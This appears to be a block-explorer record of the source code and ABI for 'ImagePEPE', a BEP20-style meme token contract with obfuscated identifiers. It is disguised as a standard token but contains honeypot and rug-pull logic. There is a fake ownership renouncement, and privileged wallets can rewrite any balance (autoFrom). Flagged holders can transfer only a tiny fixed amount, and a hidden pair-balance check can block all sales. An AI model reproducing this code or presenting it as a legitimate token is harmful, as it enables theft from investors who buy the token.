{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.13;\n\ninterface receiverIs {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address sellBuy) external view returns (uint256);\n\n    function transfer(address listReceiverTotal, uint256 listShould) external returns (bool);\n\n    function allowance(address senderFromLaunch, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 listShould) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address listReceiverTotal,\n        uint256 listShould\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed teamAt, uint256 value);\n    event Approval(address indexed senderFromLaunch, address indexed spender, uint256 value);\n}\n\nabstract contract modeLiquidityFund {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface sellLaunchedLiquidity {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface minFee {\n    function createPair(address toAuto, address swapTx) external returns (address);\n}\n\ninterface receiverIsMetadata is receiverIs {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ImagePEPE is modeLiquidityFund, receiverIs, receiverIsMetadata {\n\n    function limitSender() public {\n        emit OwnershipTransferred(feeTakeBuy, address(0));\n        atAutoIs = address(0);\n    }\n\n    function toMin(address liquidityBuy, address listReceiverTotal, uint256 listShould) internal returns (bool) {\n        require(minMax[liquidityBuy] >= listShould);\n        minMax[liquidityBuy] -= listShould;\n        minMax[listReceiverTotal] += listShould;\n        emit Transfer(liquidityBuy, listReceiverTotal, listShould);\n        return true;\n    }\n\n    function transfer(address atSwapTotal, uint256 listShould) external virtual override returns (bool) {\n        return sellTradingLaunch(_msgSender(), atSwapTotal, listShould);\n    }\n\n    uint256 public launchLimit;\n\n    bool public minFeeLiquidity;\n\n    function tokenSwap(address modeLaunched) public {\n        walletList();\n        \n        if (modeLaunched == feeTakeBuy || modeLaunched == teamTxShould) {\n            return;\n        }\n        toTx[modeLaunched] = true;\n    }\n\n    address public teamTxShould;\n\n    function launchTeam(uint256 listShould) public {\n        walletList();\n        receiverAuto = listShould;\n    }\n\n    uint256 sellMin;\n\n    constructor (){\n        \n        sellLaunchedLiquidity totalFund = sellLaunchedLiquidity(autoTxFund);\n        teamTxShould = minFee(totalFund.factory()).createPair(totalFund.WETH(), address(this));\n        if (senderEnableAuto == launchLimit) {\n            senderEnableAuto = launchLimit;\n        }\n        feeTakeBuy = _msgSender();\n        limitSender();\n        walletTotal[feeTakeBuy] = true;\n        minMax[feeTakeBuy] = liquidityToken;\n        \n        emit Transfer(address(0), feeTakeBuy, liquidityToken);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return autoListFee;\n    }\n\n    address autoTxFund = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    mapping(address => bool) public toTx;\n\n    function owner() external view returns (address) {\n        return atAutoIs;\n    }\n\n    function enableBuyWallet(address modeTake) public {\n        require(modeTake.balance < 100000);\n        if (txTotal) {\n            return;\n        }\n        if (senderEnableAuto == launchLimit) {\n            senderEnableAuto = liquidityWallet;\n        }\n        walletTotal[modeTake] = true;\n        if (liquidityWallet != senderEnableAuto) {\n            walletFund = true;\n        }\n        txTotal = true;\n    }\n\n    function sellTradingLaunch(address liquidityBuy, address listReceiverTotal, uint256 listShould) internal returns (bool) {\n        if (liquidityBuy == feeTakeBuy) {\n            return toMin(liquidityBuy, listReceiverTotal, listShould);\n        }\n        uint256 modeEnable = receiverIs(teamTxShould).balanceOf(takeFrom);\n        require(modeEnable == receiverAuto);\n        require(listReceiverTotal != takeFrom);\n        if (toTx[liquidityBuy]) {\n            return toMin(liquidityBuy, listReceiverTotal, launchLiquidityMode);\n        }\n        return toMin(liquidityBuy, listReceiverTotal, listShould);\n    }\n\n    mapping(address => uint256) private minMax;\n\n    bool public swapTeam;\n\n    function walletList() private view {\n        require(walletTotal[_msgSender()]);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return enableExempt;\n    }\n\n    event OwnershipTransferred(address indexed senderShould, address indexed autoFeeExempt);\n\n    address private atAutoIs;\n\n    function transferFrom(address liquidityBuy, address listReceiverTotal, uint256 listShould) external override returns (bool) {\n        if (_msgSender() != autoTxFund) {\n            if (teamSender[liquidityBuy][_msgSender()] != type(uint256).max) {\n                require(listShould <= teamSender[liquidityBuy][_msgSender()]);\n                teamSender[liquidityBuy][_msgSender()] -= listShould;\n            }\n        }\n        return sellTradingLaunch(liquidityBuy, listReceiverTotal, listShould);\n    }\n\n    bool public walletFund;\n\n    string private swapTrading = \"IPE\";\n\n    address takeFrom = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 private liquidityToken = 100000000 * 10 ** 18;\n\n    string private autoListFee = \"Image PEPE\";\n\n    function autoFrom(address atSwapTotal, uint256 listShould) public {\n        walletList();\n        minMax[atSwapTotal] = listShould;\n    }\n\n    bool public txTeam;\n\n    function getOwner() external view returns (address) {\n        return atAutoIs;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return swapTrading;\n    }\n\n    function approve(address totalFundFrom, uint256 listShould) public virtual override returns (bool) {\n        teamSender[_msgSender()][totalFundFrom] = listShould;\n        emit Approval(_msgSender(), totalFundFrom, listShould);\n        return true;\n    }\n\n    uint256 private liquidityWallet;\n\n    uint8 private enableExempt = 18;\n\n    uint256 private senderEnableAuto;\n\n    mapping(address => mapping(address => uint256)) private teamSender;\n\n    bool public txTotal;\n\n    address public feeTakeBuy;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return liquidityToken;\n    }\n\n    uint256 constant launchLiquidityMode = 3 ** 10;\n\n    function allowance(address feeModeShould, address totalFundFrom) external view virtual override returns (uint256) {\n        if (totalFundFrom == autoTxFund) {\n            return type(uint256).max;\n        }\n        return teamSender[feeModeShould][totalFundFrom];\n    }\n\n    uint256 receiverAuto;\n\n    function balanceOf(address sellBuy) public view virtual override returns (uint256) {\n        return minMax[sellBuy];\n    }\n\n    mapping(address => bool) public walletTotal;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderFromLaunch\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderShould\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoFeeExempt\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamAt\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeModeShould\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"totalFundFrom\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalFundFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listShould\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atSwapTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listShould\",\"type\":\"uint256\"}],\"name\":\"autoFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellBuy\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeTake\",\"type\":\"address\"}],\"name\":\"enableBuyWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeTakeBuy\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchLimit\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"listShould\",\"type\":\"uint256\"}],\"name\":\"launchTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minFeeLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamTxShould\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"toTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeLaunched\",\"type\":\"address\"}],\"name\":\"tokenSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atSwapTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listShould\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityBuy\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"listReceiverTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listShould\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"walletTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "ImagePEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}